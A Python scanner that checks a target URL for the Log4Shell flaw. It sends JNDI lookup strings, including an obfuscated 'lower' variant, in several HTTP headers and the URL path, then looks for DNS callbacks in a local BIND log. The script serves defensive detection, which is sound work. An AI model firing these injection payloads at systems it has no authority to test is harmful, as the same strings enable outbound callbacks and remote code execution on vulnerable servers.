#!/usr/bin/python3
import requests
import uuid
import logging
import urllib3
import time
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

# Change this to your DNS zone 
HOSTNAME = "yourdns.zone.here"

header_injects = [
    'X-Api-Version',
    'User-Agent',
    'Referer',
    'X-Druid-Comment',
    'Origin',
    'Location',
    'X-Forwarded-For',
    'Cookie',
    'X-Requested-With',
    'X-Forwarded-Host',
    'Accept'
]

prefixes_injects = [
    'jndi:rmi',
    'jndi:ldap',
    'jndi:dns',
    'jndi:${lower:l}${lower:d}ap'
]

def main():
    if len(sys.argv) != 2:
        print("Usage python3 nw_log4check.py http://yoururl.com")
        return

    url_input = sys.argv[1]
    identifier = uuid.uuid4()

    logging.debug(f"Generated UUID: {identifier}")
    logging.info(f"Sending requests to {url_input} using header injection...")
    # Check 1 (Header fields)
    for header in header_injects:
        for prefix in prefixes_injects:
            logging.info(f"Trying prefix {prefix} with header {header}")
            try:
                """
                Check inspired by: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
                """
                headers = {header: f'${{{prefix}://{identifier}.{HOSTNAME}/test.class}}'}
                requests.get(
                    url_input,
                    headers=headers,
                    verify=False,
                    timeout=5
                )
            except requests.exceptions.ConnectionError as e:
                logging.error(f"HTTP connection to target URL error: {e}")

    # Check 2 (Get request)
    logging.info(f"Sending requests to {url_input} using GET request injection")
    for prefix in prefixes_injects:
        logging.info(f"Trying prefix {prefix}")
        try:
            requests.get(
                f"{url_input}/${{{prefix}://{identifier}.{HOSTNAME}/test.class}}",
                verify=False,
                timeout=5,
            )
        except requests.exceptions.ConnectionError as e:
            logging.error(f"HTTP connection to target URL error: {e}")

    logging.info(f"Waiting 10 seconds for a response")
    time.sleep(10)

    logging.info(f"Checking DNS log file for requests (indicating a vulnerable system)...")
    with open('/var/log/named/query.log') as f:
        if f"{identifier}" in f.read():
            logging.info(f"VULNERABLE! System at {url_input} is potentially vulnerable as we have seen an incoming DNS request to {identifier}.{HOSTNAME}")
        else:
            logging.info(f"NOT VULNERABLE! No incoming DNS request to {identifier}.{HOSTNAME} was seen while checking system at {url_input}")

if __name__ == "__main__":
    main()
